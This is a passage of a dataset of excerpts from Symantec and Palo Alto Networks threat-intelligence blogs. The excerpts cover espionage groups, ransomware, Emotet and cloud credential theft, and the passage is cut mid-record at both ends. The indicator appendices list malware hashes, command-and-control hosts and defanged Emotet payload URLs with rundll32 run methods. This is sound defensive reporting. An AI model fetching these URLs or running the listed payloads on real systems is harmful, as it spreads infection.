"Elfin continues to be focused heavily on Saudi Arabia, which accounted for 42 percent of attacks observed by Symantec since the beginning of 2016. However, the U.S. has also been a country of significant interest to the group, with 18 organizations attacked over the past three years, including a number of Fortune 500 companies.\nElfin targets in the U.S. have included organizations in the engineering, chemical, research, energy consultancy, finance, IT, and healthcare sectors.\nSome of these U.S. organizations may have been targeted by Elfin for the purpose of mounting supply chain attacks. In one instance, a large U.S. company was attacked in the same month a Middle Eastern company it co-owns was also compromised.", "source": "Symentec"}, {"title": "Introduction", "content": "In late August 2015, Symantec identified a previously unknown back door Trojan (Backdoor.Dripion) infecting organizations primarily located in Taiwan, as well as Brazil and the United States. Dripion is custom-built, designed to steal information, and has been used sparingly in a limited number of targeted attacks. The attackers behind this campaign went to some lengths to disguise their activities, including using domains names disguised as antivirus (AV) company websites for their command and control (C&C) servers. These attacks have some links to earlier attacks by a group called Budminer involving the Taidoor Trojan (Trojan.Taidoor).\nThe threat posed by custom malware such as Dripion illustrates the value of multilayered security. Unknown threats may evade signature-based detection, but can be blocked by other detection tools which identify malicious behavior.", "source": "Symentec"}, {"title": "Background", "content": "Our investigation began when we received three file hashes, which we determined to have the functionality of a back door with information-stealing capabilities. The malware appeared to be new, rarely detected, and not publicly available. As we analyzed the binary and compared it against other known back door Trojans, we realized this was custom-developed malware.\nDeveloping a back door with information-stealing capabilities designed to evade detection requires both knowledge and funding. Usually when we see a new back door Trojan like this, it is tied to organizations involved in cyberespionage campaigns.", "source": "Symentec"}, {"title": "Conclusion", "content": "We began this investigation with what we believed was a new campaign using an unidentified back door Trojan against targets primarily in Taiwan. As the investigation grew we found multiple ties between this newly discovered attack and activity associated with the Budminer cyberespionage group:\nSame unique downloader (not publicly available and only seen used in China-based cyberespionage activity)\nThe unique downloader used by both Dripion and Taidoor encrypts data using the victim's MAC address as the RC4 key\nUse of the same blogs for distribution of malware (Taidoor and Dripion)\nUse of shared C&C infrastructure (at the root domain level)\nSimilar targeting (primary location of targets is Taiwan)\nWe compared Dripion against Taidoor malware samples to determine if there was any shared code or if it may have originated from the same developer. Our findings concluded there were no similarities between the two malware families. However, the downloader used by both malware families has unique attributes, and we believe it to be from the same developer.\nSo what does all this mean? Attribution of cyberespionage groups is difficult and needs to be done carefully based on fact and not assumptions. We have a number of ties between the two sets of activity.  Not all of the ties are strong on their own, but together provide a strong case that there is a relationship between the groups targeting Taiwan using Dripion and Taidoor malware.\nBased on the evidence we have presented Symantec attributed the activity involving the Dripion malware to the Budminer advanced threat group. While we have not seen new campaigns using Taidoor malware since 2014, we believe the Budminer group has changed tactics to avoid detection after being outed publicly in security white papers and blogs over the past few years.\nThis investigation is just one example of Symantec's ongoing effort to identify unknown emerging threats. By remaining one step ahead of adversaries, we can protect customers with intelligence-driven security.", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "File hashes\n2dd931cf0950817d1bb567e12cf80ae7\n3652075425b367d101a7d6b6ef558c6c\n59ff5624a02e98f60187add71bba3756\n865d24324f1cac5aecc09bae6a9157f5\neca0ef705d148ff105dbaf40ce9d1d5e\nf4260ecd0395076439d8c0725ee0125f\n3652075425b367d101a7d6b6ef558c6c\n285de6e5d3ed8ca966430846888a56ff\n31f83a1e09062e8c4773a03d5993d870\n4438921ea3d08d0c90f2f903556967e5\n7ad3b2b6eee18af6816b6f4f7f7f71a6\nb594d53a0d19eaac113988bf238654d3\nc3e6ce287d12ac39ceb24e08dc63e3b5\ne0c6b7d9bdae838139caa3acce5c890d\ne7205c0b80035b629d80b5e7aeff7b0e\nc182e33cf7e85316e9dc0e13999db45e\n272ff690f6d27d2953fbadf75791274c\nae80f056b8c38873ab1251c454ed1fe9\n260f19ef39d56373bb5590346d2c1811\nFE8D19E3435879E56F5189B37263AB06\n68BEBCD9D2AD418332980A7DAB71BF79\nCBDE79B6BA782840DB4ACA46A5A63467\nInfrastructure\nhyydn[.]nortonsoft.com\nmhysix[.]mcfeesoft.com\ngspt[.]dns1.us\nunpt[.]defultname.com\n198.144.100.73\n208.61.229.10\n200.215.222.105\n61.222.137.66\n103.240.182.99", "source": "Symentec"}, {"title": "Introduction", "content": "Espionage actors are continuing to mount attacks on critical national infrastructure (CNI) targets, a trend that has become a source of concern for governments and CNI organizations worldwide. Symantec's Threat Hunter Team has found evidence that a threat actor group Symantec calls Redfly used the ShadowPad Trojan to compromise a national grid in an Asian country for as long as six months earlier this year. The attackers managed to steal credentials and compromise multiple computers on the organization's network.\nThe attack is the latest in a series of espionage intrusions against CNI targets. In May 2023, the U.S., UK, Australian, Canadian, and New Zealand governmentsissued a joint alertabout threat actors targeting CNI organizations in the U.S. using techniques that could potentially be replicated against targets in other countries. The alert followedMicrosoft's report on Volt Typhoon, an espionage actor that compromised several critical infrastructure organizations in the U.S.", "source": "Symentec"}, {"title": "Introduction", "content": "An increasing number of threats have begun to leverage the Microsoft Graph API, usually to facilitate communications with command-and-control (C&C) infrastructure hosted on Microsoft cloud services.\nThe technique was most recently used in an attack against an organization in Ukraine, where a previously undocumented piece of malware used the Graph API to leverage Microsoft OneDrive for C&C purposes.", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.\nafeaf8bd61f70fc51fbde7aa63f5d8ad96964f40b7d7fce1012a0b842c83273e \u2013BirdyClient\n5c430e2770b59cceba1f1587b34e686d586d2c8ba1908bb5d066a616466d2cc6 \u2013 Bluelight\n470cd1645d1da5566eef36c6e0b2a8ed510383657c4030180eb0083358813cd3 \u2013 Graphon\nf229a8eb6f5285a1762677c38175c71dead77768f6f5a6ebc320679068293231 \u2013 Graphite\n4b78b1a3c162023f0c14498541cb6ae143fb01d8b50d6aa13ac302a84553e2d5 \u2013 Graphican\na78cc475c1875186dcd1908b55c2eeaf1bcd59dedaff920f262f12a3a9e9bfa8 \u2013 Graphican\n02e8ea9a58c13f216bdae478f9f007e20b45217742d0fbe47f66173f1b195ef5  \u2013 Graphican\n1a87e1b41341ad042711faa0c601e7b238a47fa647c325f66b1c8c7b313c8bdf \u2013 SiestaGraph\nfe8f99445ad139160a47b109a8f3291eef9c6a23b4869c48d341380d608ed4cb \u2013 SiestaGraph\n7fc54a287c08cde70fe860f7c65ff71ade24dfeedafdfea62a8a6ee57cc91950 \u2013 SiestaGraph", "source": "Symentec"}, {"title": "Introduction", "content": "A relatively new ransomware operation calling itself Buhti appears to be eschewing developing its own payload and is instead utilizing variants of the leaked LockBit and Babuk ransomware families to attack Windows and Linux systems.\nWhile the group doesn't develop its own ransomware, it does utilize what appears to be one custom-developed tool, an information stealer designed to search for and archive specified file types.\nBuhti, which first came to public attention in February 2023, was initially reported to be attacking Linux computers. However, Symantec's Threat Hunter Team has also uncovered attempts to attack Windows computers on compromised networks.\nThe group appears to be quick to exploit recently disclosed vulnerabilities, with one recent attack exploiting the recently patched PaperCut vulnerability. Since Buhti hasn't been linked to any known cyber-crime group, Symantec has assigned the actor name Blacktail to its operators.", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.\n063fcedd3089e3cea8a7e07665ae033ba765b51a6dc1e7f54dde66a79c67e1e7 - Buhti (Windows)\neda0328bfd45d85f4db5dbb4340f38692175a063b7321b49b2c8ebae3ab2868c - Buhti (Linux)\ne5d65e826b5379ca47a371505678bca6071f2538f98b5fef9e33b45da9c06206 - Buhti (Linux)\nd65225dc56d8ff0ea2205829c21b5803fcb03dc57a7e9da5062cbd74e1a6b7d6 - Buhti (Linux)\nd259be8dc016d8a2d9b89dbd7106e22a1df2164d84f80986baba5e9a51ed4a65 - Buhti (Linux)\n8b5c261a2fdaf9637dada7472b1b5dd1d340a47a00fe7c39a79cf836ef77e441 - Buhti (Linux)\n898d57b312603f091ff1a28cb2514a05bd9f0eb55ace5d6158cc118d1e37070a - Buhti (Linux)\n515777b87d723ebd6ffd5b755d848bb7d7eb50fc85b038cf25d69ca7733bd855 - Buhti (Linux)\n4dc407b28474c0b90f0c5173de5c4f1082c827864f045c4571890d967eadd880 - Buhti (Linux)\n22e74756935a2720eadacf03dc8fe5e7579f354a6494734e2183095804ef19fe - Buhti (Linux)\n18a79c8a97dcfff57e4984aa7e74aa6ded22af8e485e807b34b7654d6cf69eef - Buhti (Linux)\n01b09b554c30675cc83d4b087b31f980ba14e9143d387954df484894115f82d4 - Buhti (Linux)\n7eabd3ba288284403a9e041a82478d4b6490bc4b333d839cc73fa665b211982c - Buhti (Linux)\n287c07d78cafc97fb4b7ef364a228b708d31e8fe8e9b144f7db7d986a1badd52 - Buhti (Linux)\n32e815ef045a0975be2372b85449b25bd7a7c5a497c3facc2b54bcffcbb0041c - Cobalt Strike Beacon\n5b3627910fe135475e48fd9e0e89e5ad958d3d500a0b1b5917f592dc6503ee72 - Cobalt Strike Beacon\nd59df9c859ccd76c321d03702f0914debbadc036e168e677c57b9dcc16e980cb - Cobalt Strike Beacon\nde052ce06fea7ae3d711654bc182d765a3f440d2630e700e642811c89491df72 - Cobalt Strike Beacon\n65c91e22f5ce3133af93b69d8ce43de6b6ccac98fc8841fd485d74d30c2dbe7b - Meterpreter\n8041b82b8d0a4b93327bc8f0b71672b0e8f300dc7849d78bb2d72e2e0f147334 - Meterpreter\n8b2cf6af49fc3fb1f33e94ad02bd9e43c3c62ba2cfd25ff3dfc7a29dde2b20f2 - Meterpreter\n97378d58815a1b87f07beefb24b40c5fb57f8cce649136ff57990b957aa9d56a \u2013 Meterpreter\nc33e56318e574c97521d14d68d24b882ffb0ed65d96203970b482d8b2c332351 - Meterpreter\n9b8adde838c8ea2479b444ed0bb8c53b7e01e7460934a6f2e797de58c3a6a8bf - Possible Meterpreter\n9f0c35cc7aab2984d88490afdb515418306146ca72f49edbfbd85244e63cfabd - Exfiltration tool\nca6abfa37f92f45e1a69161f5686f719aaa95d82ad953d6201b0531fb07f0937 - Possible exfiltration tool\nbdfac069017d9126b1ad661febfab7eb1b8e70af1186a93cb4aff93911183f24 - Sliver\n91.215.85[.]183\n81.161.229[.]120", "source": "Symentec"}, {"title": "Introduction", "content": "While ransomware has long been one of the main cyber threats to businesses, the past number of months have seen organizations more exposed than ever.Symantec's latest research paper on ransomwarehas found that businesses were the main victims of theWannaCryandPetyaoutbreaks, with corporate networks the ideal breeding ground for this new generation of self-propagating threats.\nOur research found that overall ransomware infection numbers have continued to trend upwards.  During the first six months of 2017, Symantec blocked just over 319,000 ransomware infections. If this infection rate continued for the full year, 2017 would be a significant increase over 2016, when a total of 470,000 infections were blocked. Contributing to this increase was a spike in blocked infections during May and June 2017, the months when the WannaCry and Petya outbreaks occurred.", "source": "Symentec"}, {"title": "Introduction", "content": "Symantec has identified a previously unknown group called Sowbug that has been conducting highly targeted cyber attacks against organizations in South America and Southeast Asia and appears to be heavily focused on foreign policy institutions and diplomatic targets. Sowbug has been seen mounting classic espionage attacks by stealing documents from the organizations it infiltrates.\nSymantec saw the first evidence of Sowbug-related activity with the discovery in March 2017 of an entirely new piece of malware called Felismus used against a target in Southeast Asia.  We have subsequently identified further victims on both sides of the Pacific Ocean. While the Felismus tool was first identified in March of this year, its association with Sowbug was unknown until now. Symantec has also been able to connect earlier attack campaigns with Sowbug, demonstrating that it has been active since at least early-2015 and may have been operating even earlier.\nTo date, Sowbug appears to be focused mainly on government entities in South America and Southeast Asia and has infiltrated organizations in Argentina, Brazil, Ecuador, Peru, Brunei and Malaysia. The group is well resourced, capable of infiltrating multiple targets simultaneously and will often operate outside the working hours of targeted organizations in order to maintain a low profile.", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "Backdoor.Felismus samples\nMD5                                                              Detection\n514f85ebb05cad9e004eee89dde2ed07    Backdoor.Felismus\n00d356a7cf9f67dd5bb8b2a88e289bc8     Backdoor.Felismus\nc1f65ddabcc1f23d9ba1600789eb581b     Backdoor.Felismus\n967d60c417d70a02030938a2ee8a0b74   Backdoor.Felismus\nTrojan.Starloader samples\nMD5                                                                Detection\n4984e9e1a5d595c079cc490a22d67490            Trojan.Starloader\nHacktools\nMD5                                                                 Detection\ne4e1c98feac9356dbfcac1d8c362ab22                Hacktool.Mimikatz\nInstallation directory\n%WINDOWS%\\debug\n%APPDATA%\\microsoft\\security\nCommand and control infrastructure\nnasomember[DOT]com\ncosecman[DOT]com\nunifoxs[DOT]com", "source": "Symentec"}, {"title": "Introduction", "content": "Inpart 1of this 2-part blog series, we discussed why the Havex Trojan is a significant and concerning industry milestone. Here, in part 2, we look at how you can mitigate your exposure through the combination of good practices and next-generation firewall technology.\nIn my initial engagements with control systems operators interested in our technology, two security objectives, both linked with the objective of keeping uptime high, frequently come up.\nFirst, the operations manager, or person responsible for security in the operational technology (OT) environment, is concerned over whether only the approved users are using the right applications and resources in the specific usage model intended for SCADA. This person, at the very basic level, would want to be able to validate that the system is used only in a way that aligns with the business objectives, ultimately with the goal of implementing role-based access control.  In this person's mind, an internal user accidentally causing system downtime is as much a cyberthreat as an incident malicious in nature.\nSecond, there is a concern that malware, especially APTs that have never been seen in the wild, would, by accident or on purpose, get introduced into the network disrupting service availability.\nNot surprisingly, I often find that a couple of core capabilities critical for achieving these security objectives, namely protocol/application layer visibility and zero-day threat detection, are not yet deployed in their OT environment.\nMost operators only have legacy stateful inspection firewalls (port-level visibility) plus add-ons like IPS/AV (block known threats). Whether they've been lax in upgrading their technology, or for some other reason, these operators are finding that their technologies have simply run out of steam and cannot provide the type of visibility, security controls, and threat prevention required to combat advanced threats. It is imperative that asset owners take a fresh look at better techniques and tools  that can help improve security posture to the required level and reduce downtime due to cyberincidents.  So what are some of these options?", "source": "Palo"}, {"title": "Introduction", "content": "While researching prevalent commodity Remote Access Tools (RATs), Unit 42 researchers discovered a new, undocumented RAT in September, which had almost 50 samples observed in more than 2,200 attack sessions within the first month it was sold. In this report, we document the RAT manager/builder, client malware, and profile the Swedish actor behind this together with his promotion and sale of his malware. We also document this RAT already being used in malicious attacks in the wild.", "source": "Palo"}, {"title": "Conclusion", "content": "Commodity RATs are often sold on the internet for years, their authors profiting while enabling malicious actors to spread thousands of samples of malware, built with their RAT builders.\nThe opportunity to document a RAT within days of its emergence, and to identify the individual behind it \u2013 in this case, an 18-year-old from Sweden, will hopefully enable authorities to take timely action against this actor, and his customers. Unit 42 has fully identified this actor; we will not share his identity here, but we have ensured that the correct authorities have been advised. The longer this is sold, not only the more samples of this RAT will be built and spread, but also the opportunity for other actors to crack this RAT and distribute it indiscriminately. It is important to identify and interdict the sale of such malware as early as possible to prevent its proliferation, which enables a large population of unsophisticated threat actors.\nOrganizations with decent spam filtering, proper system administration, and up-to-date Windows hosts have a much lower risk of infection. Palo Alto Networks customers are further protected from this threat. Our threat prevention platform detects Blackremote malware, with Wildfire and Traps.AutoFocususers can track this activity using theBlackremotetag.\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. For more information on the Cyber Threat Alliance, visit www.cyberthreatalliance.org.", "source": "Palo"}, {"title": "Introduction", "content": "Cybercriminals regularly leverage popular dynamic domain name system (DDNS) or web hosting services to store and distribute their content. Threat actors leverage these for command and control (C2), malware distribution and phishing. This abuse has created the need for new detection methods for malicious subdomains.\nDDNS and web hosting services often allow people to serve content from subdomains of a domain registered by the service provider. These subdomains offer the possibility of detecting malicious activity at the level of the DNS, but to do so is more difficult than detecting malicious registered domains.\nMalicious domain detection has typically relied on information that may not be available for these subdomains of registered domains. For example,WHOISinformation can reveal whether a domain has recently been registered, and (in some cases) who registered the domain. WHOIS information is not available for the subdomains of public apex domains, though.\nGiven this lack of information typically used to detect malicious domains, identifying malicious subdomains requires new methods. Palo Alto Networks has developed a system to detect malicious subdomains of public apex domains.\nThe detections generated by this detector are available toPalo Alto Networks Next-Generation Firewallcustomers withCloud-Delivered Security Services, includingDNS SecurityandAdvanced URL Filtering.", "source": "Palo"}, {"title": "Conclusion", "content": "Systems to detect malicious subdomains of public apex domains cannot simply employ the same approaches traditionally used to detect malicious registered domains. These subdomains have unique characteristics that require defenders to adapt methods to establish subdomain reputation. Developing such methods is an important task for security researchers and network defenders.\nPalo Alto Networks assigns detected subdomains of public apex domains to the grayware category through ourCloud-Delivered Security Services. These subscriptions includeDNS SecurityandAdvanced URL Filtering.", "source": "Palo"}, {"title": "Introduction", "content": "Mutex analysis is an often overlooked and useful tool for malware author fingerprinting, family classification, and even discovery. Far from the hypothesized \"huge amount of variability\" in mutex names, likely hypothesized due to the seemingly random appearance of them, practical mutex usage is embarrassingly consistent. In fact, over 15% of all collected worms share a single mutex [2gvwnqjz].\nThis blog was sourced from the data generated by the WildFire Analytics cloud, which processes thousands of samples a day and provides insights into various characteristics and behaviors of malware worldwide. But before we get into the details, here is a quick overview of mutexes and why they exist in the first place.", "source": "Palo"}, {"title": "Conclusion", "content": "Mutex name analysis as a whole offers a unique look into the results of any sample classification system and the malware therein. While the research may never result in a fully automated decision system, it has been proven that researchers employing a hybrid approach to analysis will be able to provide critical and timely information to support the continual improvement of the classification system as a whole.\nFrom edge case to systematic misclassifications, mutex usage is even more generally the canary in a coal mine than waspreviously realized.", "source": "Palo"}, {"title": "Introduction", "content": "ZergHelper implemented the protocols between the iTunes client for PC and Apple's App Store servers. To be more specific, these functionalities have been implemented in the app:\nLog into the App Store, cache authentication data, and log out of the account \nClick the term of service \nGet an app's information \nPurchase an app (Figure 9) \nDownload the purchased app\nWhen communicating with Apple's server, ZergHelper used a User Agent like this:\niTunes/12.0.1 (Windows; Microsoft Windows 7 x64 Business Edition iTunes/12.0.1 (Windows; Microsoft Windows 7 x64 Business Edition\nHence the app is trying to act as an iTunes 12.0.1 client running on Windows 7 system.\nFigure 9: Code to purchase an app by simulating the iTunes protocol\nWe're still not very clear in which ways ZergHelper used these functionalities. It's possible that they were used for the Apple ID given by users, or by the \"free\" Apple ID provided by the app itself.", "source": "Palo"}, {"title": "Introduction", "content": "Emotet is one of the most prolific email-distributed malware families in our current threat landscape. Although a coordinated law enforcement effort shut down this malware in January 2021, Emotet resumed operations in November 2021. Since then, Emotet has returned to its status as a prominent threat.\nThis blog provides a background on Emotet, and it reviews activity from this malware family since its return in November 2021. The information covers changes in Emotet operations from its revival through the end of January 2022. These examples will provide a more comprehensive picture and better indicate the worldwide threat Emotet currently poses.\nPalo Alto Networks customers are protected from Emotet withCortex XDRor ourNext-Generation FirewallwithWildFireandThreat Preventionsubscriptions.", "source": "Palo"}, {"title": "Background", "content": "Sometimes referred to as Geodo or Feodo, Emotet is Windows-based malware that first appeared in 2014 as a banking Trojan. Since then, Emotet has evolved into modular malware that performs various functions, including information stealing, spambot activity and loading other malware.\nThe threat actor behind Emotet is known through different designators, likeMealybug,MUMMY SPIDERorTA542.\nEmotet's primary method of distribution is through email.\nEmotet is a prolific spammer. Emotet-infected computers often act as spambots, sending a dozen or more emails every minute that push more Emotet. This means thousands of Emotet emails can be sent by a single host every day. If hundreds of Emotet-infected hosts are active at any given time, this means hundreds of thousands of Emotet emails can be generated each day Emotet is actively spamming.\nEmotet is evasive. Through a technique called hashbusting, Emotet generates different file hashes for malware distributed through its botnets. This ensures a malware sample's SHA256 hashis different on each infected system. Emotet also uses obfuscated code in scripts used during its initial infection process.\nEmotet is nimble. Its botnets frequently update IP addresses and TCP ports used for command and control (C2) communications. Emotet also frequently changes URLs hosting its malware, sometimes using dozens of different URLs each day.\nEmails distributing Emotet contain malicious attachments, or they contain links to malicious files. These messages most often contain Microsoft Office files like Word documents or Excel spreadsheets. These Office documents contain malicious macro code. The code is designed to infect a vulnerable Windows host after a victim enables macros.\nAs it rose to prominence, Emotet began distributing other malware likeGootkit,IcedID,QakbotandTrickbot.\nBy September 2019, Emotet's infrastructure wasrunning on three separate botnets. These botnets were designated by the security research teamCryptolaemusas epoch 1, epoch 2 and epoch 3. The epoch designators are often abbreviated as E1, E2 and E3.\nBy 2020, a significant portion ofmalicious spam pushing Emotet used thread hijacking. Thread hijacking is a technique that utilizes legitimate messages stolen from infected computers' email clients. Emotet emails have frequently spoofed legitimate users and impersonated replies to these stolen emails.\nEmotet occasionally takes a break from delivering malicious emails.Emotet's longest absencefrom the threat landscape occurred in early February 2020 and lasted more than five months. Emotet resumed operations in mid-July 2020, and it quicklysurpassed other threatsin sheer volume of malicious spam.\nIn January 2021, a collaborative effort by law enforcement agencies and other authoritiesdisrupted Emotet operations. This effectively stopped the threat actor, and Emotet disappeared from our threat landscape.\nApproximately 10 months later, Emotet resumed operations in mid-November 2021.", "source": "Palo"}, {"title": "Conclusion", "content": "Since its return in November 2021, Emotet has once again become one of the most prolific malware families in our current threat landscape. Hundreds of thousands of emails can be generated each day Emotet is actively spamming. Hashbusting, code obfuscation and other evasion techniques make Emotet a significant threat.\nWindows users can lower their risk from Emotet through spam filtering, proper system administration and ensuring their software is patched and up to date. Palo Alto Networks customers are further protected from Emotet throughCortex XDRand ourNext-Generation FirewallwithWildFireandThreat Preventionsubscriptions.\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Indicators", "content": "Due to hashbusting, daily changes in malware URLs and frequent changes for infection patterns, we can see hundreds of new indicators for Emotet every day. These indicators are too numerous and changes are too frequent to be useful in any single list. However,abuse.chis a research project that provides free trackers forEmotet botnet command and control servers,URLs hosting Emotet malwareandEmotet malware samples.\nAppendicesA,B,CandDprovide a small selection of indicators referenced in this blog post.", "source": "Palo"}, {"title": "Appendix", "content": "a1ab66a0fbb84a29e5c7733c42337bc733d8b3c11e2d9f9e4357f47fb337c4d5 3.zip176cfa7f0742d5a79b9cfbf266c437b965fc763cf775415ca251c6bb2dd5e9e5 9.zip6c34e373479e1a7485025dc3ffa5d23db999aea83e4f3759bd8381fb88e2bbbf 435.zip8dc28ac1c66f3d17794bb0059445f4deb9db029eb6d4ea1adca734d035bdaecf 1811.zip4668e7d6bdb00fb80807ed91eef5ac9f6ba0dfd50d260d3e0240847b0ec16f69 18112021.zipbfdad57171267921a678ba9d86fd096c00197524698cc03a84d2cfeefdca5587 433492807279.zip66c34636aaf73f74df8da9981ca6054eb4143d1761dbde8e0e83899805590db2 763325738862.zip\n3.zippassword:0089.zippassword:3854435.zippassword:6361811.zippassword:948318112021.zippassword:2927433492807279.zippassword:209763325738862.zippassword:339\n304fba4a048904744d6d1c4d8bfd5d7b4019c2c45aba0499d797ee0d6807dfa8 3.doce5f3a7e75c03d45462992b0a973e7e25b533e293724590c9eb34f5ee729039b0 9.doc0cacc247469125b5e0977b9de9814db0eb642c109ca5d13ee9c336aef2ec4c19 435.doc801ec1ec71051838efe75fd89344b676fa741d9e7718e534f119c57a899f4792 1811.doccbddc8fea92cdf40f8efac2fe8fa534d52d90cccecbb914f3827002f680da98a 18112021.docfccaf2af38484493d763b0ea37e68a40eb6def3030cfa975fa8d389e96b49378 433492807279.docd655ab6b9350ec4f64c735cd23be62ca87d49165b244cefe75ad0dbb061de3d4 763325738862.doc\nhxxp://jamaateislami[.]com/wp-admin/FKyNiHeRz1/hxxp://voltaicplasma[.]com/wp-includes/wkCYpDihyc8biTPn444B/hxxp://linebot.gugame[.]net/images/RX6MVSCgGr/hxxp://lpj917[.]com/wp-content/Cc4KG1MDR4xAWp91SjA/hxxp://html.gugame[.]net/img/5xUBiRIQ4s3EtKEv67Ebn/hxxp://xanthelasmaremoval[.]com/wp-includes/VVVcpYsRtGgjQqfgjxbS/hxxp://giadinhviet[.]com/pdf/log_in/8kQBFUyohsDRGCJx/\nSHA256 hash:555dff455242a5f82f79eecb66539bfd1daa842481168f1f1df911ac05a1cfbaFile size:485,376 bytesFile location:hxxp://jamaateislami[.]com/wp-admin/FKyNiHeRz1/File location:C:\\ProgramData\\1245045870.dllFile location:C:\\Users\\[username]\\AppData\\Local\\Tzbklmcf\\ljkklzcncxkf.pgkRun method from Windows Registry update:rundll32.exe[filename],truHNmRuLNote 1:This was generated using1811.docNote 2:The entry point used with rundll32.exe can be any alpha-numeric value\n51.178.61[.]60port443103.161.172[.]108port443122.129.203[.]163port443", "source": "Palo"}, {"title": "Appendix", "content": "hxxp://hispanicaidgroup[.]org/ufay0vq/keWIgzwT/\nSHA256 hash:450cba4a0f2b8c14dee55c33c9c0f522a4dddd1b463e39e8e736ed37dc2fac74File size:472 bytesFile location:hxxps://locstorageinfo.z13.web.core.windows[.]net/ioocceneen.appinstaller\nSHA256 hash:7c55c3656184b145b3b3f6449c05d93fa389650ad235512d2f99ee412085cf3aFile size:1,261,364 bytesFile location:hxxps://locstorageinfo.z13.web.core.windows[.]net/ioocceneen.appxbundle\nSHA256 hash:36a81cd64e7649d9f91925194e89e8463c980682596eef19c4f5df6e1ac77b2aFile size:192,800 bytesIn Appixbundle at:ioocceneen.appxbundle/Adobe_1.2.0.0_x86/CustomParts/wsprotocol.exe\nSHA256 hash:a04714dcfad52b9dbf2f649810a6c489c5eb2a15118043f0173571310597b8cbFile size:643,147 bytesFile location:hxxp://www.thebanditproject[.]com/wp-content/BvZK54PFsCqKio6/File location:C:\\Users\\[username]\\AppData\\Local\\Pvglfpllzel\\bhryuac.wmnRun method:rundll32.exe[filename],[any alpha-numeric value]\n46.55.222[.]11port443163.172.50[.]82port443", "source": "Palo"}, {"title": "Appendix", "content": "SHA256 hash:fcf5500a8b46bf8c7234fb0cc4568e2bd65b12ef8b700dc11ff8ee507ba129daFile size:194,273 bytesFile name:REP_1671971987654103376.xls\nSHA256 hash:97ebdff655fa111863fbd084f99187c9b6b369fe88fdb1333f8b89aac09fc48dFile size:10,980 bytesFile location:hxxp://87.251.86[.]178/pp/_.html\nSHA256 hash:a08271fe6d67cc6cf678683f58e22412e6872a985a03b8444584bea57aa3cbb7File size:721 bytesFile location:hxxp://87.251.86[.]178/pp/PP.PNG\nhxxp://mustache.webstory[.]sa/wp-includes/cRwe2Pkxasj/hxxps://vdevigueta[.]com/wp-admin/qYOwD7kPD6JX/hxxp://bujogradba[.]com/5tvjjl/qiP8H0W5GmR5P9fGIw/hxxps://daxinghuo[.]com/get/oU8lM4P/hxxp://masl[.]cn/1/4Ilcpoj6PjTsj3eAR/\nSHA256 hash:7c35902055f69af2cbb6c941821ceba3d79b2768dd2235c282b195eb48cc6c83File size:1,257,472 bytesFile location:hxxp://mustache.webstory[.]sa/wp-includes/cRwe2Pkxasj/File location:C:\\Users\\Public\\Documents\\ssd.dllFile location:C:\\Users\\[username]\\AppData\\Local\\Piqvlxzjzu\\vrjlv.srnRun method:rundll32.exe[filename],[any alpha-numeric value]\n54.37.212[.]235port80144.202.34[.]169port443", "source": "Palo"}, {"title": "Appendix", "content": "hxxp://goodmarketinggroup[.]com/newish/562_9559085/\nhxxp://goodmarketinggroup[.]com/newish/562_9559085/?i=1\nSHA256 hash:292826fa66737d718d0d23f5842dc88e05c8ba5ade7e51212dded85137631b31File size:85,352 bytesFile name:06028_2603.xlsm\nhxxp://mammy-chiro[.]com/case/ZTkBzbz/hxxp://bluetoothheadsetreview[.]xyz/wp-includes/xmdHAGgfki/hxxp://topline36[.]xyz/wp-includes/css/BB9Ajvjs89U9O/\nSHA256 hash:4978285fc20fb2ac2990a735071277302c9175d16820ac64f326679f162354ffFile size:481,792 bytesFile location:hxxp://mammy-chiro[.]com/case/ZTkBzbz/File location:C:\\Users\\[username]\\dwa.ocxFile location:C:\\Users\\[username]\\AppData\\Local\\Fhcnkauwkz\\gavlgclbak.wwaRun method:rundll32.exe[filename],[any alpha-numeric value]\n41.226.30[.]6 port 808045.138.98[.]34 port 8062.141.45[.]103 port 443161.97.77[.]73 port 443", "source": "Palo"}, {"title": "Introduction", "content": "Cloud breaches often stem from misconfigured storage services or exposed credentials. A growing trend of attacks specifically targets cloud compute services to steal associated credentials and illicitly gain access to cloud infrastructure. These attacks could cost targeted organizations both in terms of unexpected charges for extra cloud resources added by the threat actor, as well as time required to remediate the damage.\nThis blog highlights two examples of cloud compute credentials attacks in the wild. While the initial access phase is important, we will focus on the post-breach actions executed during the attack, and share the flow of these two attacks against the cloud infrastructure. Theattack flowsshow how threat actors abuse stolen compute credentials to pursue a variety of attack vectors (such as cryptomining, data theft, etc.) and abuse cloud services in unexpected ways.\nTo detect the attacks described below, cloud logging and monitoring best practices as outlined by Amazon Web Services (AWS) andGoogle Cloudare essential, as they provide visibility into activity at the cloud infrastructure level. This emphasizes how important it is to follow Amazon Web Services and Google Cloud logging and monitoring best practices.\nPalo Alto Networks helps organizations address security issues in the cloud withCortex XDR for cloud, which detects cloud attacks such as cloud compute credentials theft andPrisma Cloud, which manages identity entitlement with least privilege entitlements.", "source": "Palo"}, {"title": "Conclusion", "content": "The theft of a compute workload's token is the common denominator for both cases we've discussed. While both examples above involve serverless services, this attack vector is relevant to all compute services.\nIt is important to emphasize that this type of attack could occur from different attack paths \u2013 including application vulnerabilities or zero-day exploits such asLog4Shell\u2013 not only from misconfigurations or poor cloud security posture management (CSPM).\nTo handle such attacks, cloud audit logs are essential, both for detection and for investigation and response (IR). Cloud audit monitoring is even more critical for serverless workloads where agents cannot be installed, thus making it harder to stop such attacks.\nLogging and monitoring best practices provided byAWSandGoogle Cloudgive clear guidance for how to prevent such cases. The AWSGuardDutyservice could also help with detecting and alerting on similar attacks, such asEC2 instance credentials used from another AWS account. An additional prevention method is toconfigure an interface endpoint policy for Lambdato limit the usage of Lambda only within a VPC.\nPalo Alto Networks customers receive protections from compute token theft with:\nCortex XDR for cloud, which provides SOC teams with a full incident story across the entire digital domain by integrating activity from cloud hosts, cloud traffic, and audit logs together with endpoint and network data. \nPrisma Cloud, which assists organizations in 